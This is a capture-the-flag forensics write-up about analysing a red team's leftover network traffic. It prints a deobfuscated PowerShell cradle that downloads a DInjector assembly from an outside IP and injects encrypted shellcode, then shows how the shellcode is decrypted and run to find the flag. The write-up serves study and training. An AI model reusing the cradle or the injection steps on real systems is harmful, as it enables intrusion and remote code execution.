> During a recent red team engagement one of our servers got compromised.
> Upon completion the red team should have deleted any malicious artifact or
> persistence mechanism used throughout the project. However, our engineers
> have found numerous of them left behind. It is therefore believed that there
> are more such mechanisms still active.
> Can you spot any, by investigating this network capture?

> Author: **[thewildspirit][author-profile]**

## Extracting stream objects

Right away, Wireshark can put together the data exchanged:

```shell
tshark -r sources/capture.pcap --export-objects http,payloads/
ls -lah payloads/
# 4466600  4 -rw-r--r-- 1 flatline flatline  2232 May  3 17:46 4A7xH.ps1
# 4466602  4 -rw-r--r-- 1 flatline flatline   336 May  3 17:47 9tVI0
# 4466601 88 -rw-r--r-- 1 flatline flatline 86528 May  3 17:46 user32.dll
```

They can be easily labeled:

```shell
file payloads/9tVI0 
#payloads/9tVI0: OpenPGP Public Key
file payloads/user32.dll
# payloads/user32.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

And `4A7xH.ps1` is a Powershell script.

## Deobfuscating the script

The Powershell script is a little obfuscated:

```powershell
sV  ("{0}{1}" -f'Y','uE51') ([typE]("{5}{0}{2}{3}{1}{4}"-f 'STeM','EcTIOn.aS','.REF','L','SemblY','Sy'));  ${a} = ("{0}{1}{2}{3}{4}" -f 'cu','rr','en','tth','read')
```

Still it can be executed instruction by instruction to unveil its meaning:

```powershell
sV ('YuE51')([type] 'SySTeM.REFLEcTIOn.aSSemblY')
${a} = 'currentthread'
${b} = '147.182.172.189'
${c} = 80
${d} = 'user32.dll'
${e} = '9tVI0'
${f} = 'z64&Rx27Z$B%73up'
${g} = 'C:\Windows\System32\svchost.exe'
${h} = 'notepad'
${i} = 'explorer'
${j} = 'msvcp_win.dll'
${k} = 'True'
${l} = 'True'

${methods} = @('remotethread', 'remotethreaddll', 'remotethreadview', 'remotethreadsuspended')
if (${methods}.Contains.Invoke(${a})) {
    ${h} = (&'Start-Process' -WindowStyle 'Hidden' -PassThru ${h}).'Id'
}

${methods} = @('remotethreadapc', 'remotethreadcontext', 'processhollow')
if (${methods}.Contains.Invoke(${a})) {
    try {
        ${i} = (&'Get-Process' ${i} -ErrorAction 'Stop').'Id'
    }
    catch {
        ${i} = 0
    }
}

${cmd} = 'currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:8668 /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True'

${data} = (.'Invoke-WebRequest' -UseBasicParsing 'http://147.182.172.189:80/user32.dll').'Content'
${assem} =  ( ls 'vaRIaBLe:yUE51'  ).'Value'::'Load'.Invoke(${data})

${flags} = [Reflection.BindingFlags] ('NonPublic,Static')

${class} = ${assem}.('GetType').Invoke(('DInjector.Detonator'), ${flags})
${entry} = ${class}.('GetMethod').Invoke(('Boom'), ${flags})

${entry}.'Invoke'(${null}, (, ${cmd}.('Split').Invoke(" ")))
```

It is almost exactly the [cradle.ps1][cradle-script] from [snovvcrash][snovvcrash].

## DInjector

The script uses [DInjector][dinjector]:

- with an encrypted shellcode:
    - stored in `9tVI0`
    - and its password is `z64&Rx27Z$B%73up`
- the DInjector library is renamed `user32.dll`
- it spawns a new `svchost.exe` thread:
    - and loads `msvcp_win.dll` to host the shell code
    - to finally call the `boom` function

So the flag is certainly is the encrypted shellcode.

## Decrypting the shellcode

The repository of DInjector details the steps and provides an encryption script, [encrypt.py][encryption-script].

The shellcode is most like encrypted with the AES routine. It requires a password
and an IV of 16 random bytes:

```python
if args.algorithm == 'aes':
    iv = os.urandom(16)
    ctx = AES(args.password, iv)
```

The IV is actually placed at the start of the output:

```python
return self.iv + encryptor.update(raw) + encryptor.finalize()
```

And it can be seen with:

```shell
xxd -p -c 16 payloads/9tVI0 | head -n1
# 9907bb679e1765dcbdb467c1c4b00d21
````

Just in case, I tried with both decryption schemes:

```python
def xor(m: bytes, k: bytes) -> bytes:
    return bytes([m[__i] ^ k[__i % len(k)] for __i in range(len(m))])

__cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
__decryptor = __cipher.decryptor()

__shellcode_aes = __decryptor.update(RAW[16:]) + __decryptor.finalize()
__shellcode_xor = xor(m=RAW, k=PASSWORD)
```

## Running the shellcode

The flag is not directly apparent in the shellcode. Let's try and run this
code in [BlobRunner][blobrunner].

In the command prompt:

```powershell
.\blobrunner.exe .\shellcode.aes.bin
```
After attaching [x32dbg][x32dbg], the "memory map" tab helps us navigate to the
shellcode at `0xDE0000`.

Running step by step, the process reaches a XOR loop, which generates the following output:

![][flag]

[author-profile]: https://app.hackthebox.com/users/70891
[blobrunner]: https://github.com/OALabs/BlobRunner
[cradle-script]: https://github.com/snovvcrash/DInjector/blob/main/cradle.ps1
[dinjector]: https://github.com/snovvcrash/DInjector
[flag]: images/screenshot-flag.png
[encryption-script]: https://github.com/snovvcrash/DInjector/blob/main/encrypt.py
[snovvcrash]: https://github.com/snovvcrash
